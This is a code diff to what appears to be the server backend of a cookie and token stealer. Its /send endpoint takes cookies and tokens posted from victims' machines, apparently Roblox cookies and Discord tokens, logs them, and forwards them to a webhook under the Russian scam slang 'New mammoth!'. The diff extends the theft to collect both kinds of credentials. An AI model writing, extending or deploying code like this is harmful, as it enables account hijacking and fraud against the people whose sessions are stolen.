@@ -16,17 +16,30 @@ app.get('/download', async (req, res) => {
 
 app.post('/send', async (req, res) => {
         const reqBody = req.body;
+        const cookies = reqBody.cookies;
+        const tokens = reqBody.tokens;
         const fieldsArray = [];
+        const fieldsArray2 = [];
         let index = 0;
-        console.log(reqBody);
-        for (const key in reqBody) {
-            if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
+        console.log(cookies);
+        for (const key in cookies) {
+            if (Object.prototype.hasOwnProperty.call(cookies, key)) {
                 index++;
                 //name: "Memory",
                 //value: "4.2 GB / 16 GB",
                 //inline: true
-                fieldsArray.push(reqBody[key]);
-                console.log(reqBody[key],index);
+                fieldsArray.push(cookies[key]);
+                console.log(cookies[key],index);
+            }
+        }
+        for (const key in tokens) {
+            if (Object.prototype.hasOwnProperty.call(tokens, key)) {
+                index++;
+                //name: "Memory",
+                //value: "4.2 GB / 16 GB",
+                //inline: true
+                fieldsArray2.push(tokens[key]);
+                console.log(tokens[key],index);
             }
         }
         console.log(`Новый мамонт!\nКуки: ${fieldsArray.concat("\n \n")}`);
@@ -35,7 +48,7 @@ app.post('/send', async (req, res) => {
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\nКуки:\n${fieldsArray.concat("\n\n")}` })
+            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\nРБ:\n${fieldsArray.concat("\n\n")}\nДС:\n${fieldsArray2.concat("\n\n")}` })
         });
         console.log(response);
         // Формируем правильную структуру для Discord
